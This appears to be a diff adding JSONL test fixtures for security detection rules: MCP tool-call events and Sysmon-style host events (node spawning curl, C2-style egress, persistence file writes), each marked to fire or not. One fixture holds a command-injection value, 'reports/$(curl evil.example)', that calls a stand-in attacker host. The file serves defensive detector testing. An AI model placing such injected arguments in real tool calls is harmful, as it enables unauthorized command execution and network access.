@@ -1,0 +1,11 @@
+{"name": "cmd_injection_in_tool_arg", "rule": "mcp", "should_fire": true, "event": {"event_type": "tool_call", "tool_name": "generate_report", "tool_argument": "reports/$(curl evil.example)", "capability_declared": true}}
+{"name": "undeclared_capability_invoked", "rule": "mcp", "should_fire": true, "event": {"event_type": "tool_call", "tool_name": "organize_files", "tool_argument": "/home/dev/project", "capability_declared": false}}
+{"name": "egress_to_c2_not_allowlisted", "rule": "mcp", "should_fire": true, "event": {"event_type": "outbound_connection", "destination_host": "legit-analytics.com"}}
+{"name": "egress_to_allowlisted_registry", "rule": "mcp", "should_fire": false, "event": {"event_type": "outbound_connection", "destination_host": "registry.npmjs.org"}}
+{"name": "benign_declared_tool_call", "rule": "mcp", "should_fire": false, "event": {"event_type": "tool_call", "tool_name": "organize_files", "tool_argument": "/home/dev/project", "capability_declared": true}}
+{"name": "beacon_node_spawns_curl", "rule": "host", "should_fire": true, "event": {"EventID": 1, "ParentImage": "C:\\Program Files\\nodejs\\node.exe", "Image": "C:\\Windows\\System32\\curl.exe"}}
+{"name": "network_to_com_c2", "rule": "host", "should_fire": true, "event": {"EventID": 3, "Image": "C:\\Program Files\\nodejs\\node.exe", "DestinationHostname": "backup-service.com"}}
+{"name": "persistence_health_check_file", "rule": "host", "should_fire": true, "event": {"EventID": 11, "Image": "C:\\Program Files\\nodejs\\node.exe", "TargetFilename": "/usr/local/bin/health-check"}}
+{"name": "node_to_github_benign", "rule": "host", "should_fire": false, "event": {"EventID": 3, "Image": "C:\\Program Files\\nodejs\\node.exe", "DestinationHostname": "api.github.com"}}
+{"name": "browser_to_analytics_benign", "rule": "host", "should_fire": false, "event": {"EventID": 3, "Image": "C:\\Program Files\\Google\\Chrome\\chrome.exe", "DestinationHostname": "legit-analytics.com"}}
+{"name": "node_spawns_node_benign", "rule": "host", "should_fire": false, "event": {"EventID": 1, "ParentImage": "C:\\Program Files\\nodejs\\node.exe", "Image": "C:\\Program Files\\nodejs\\node.exe"}}
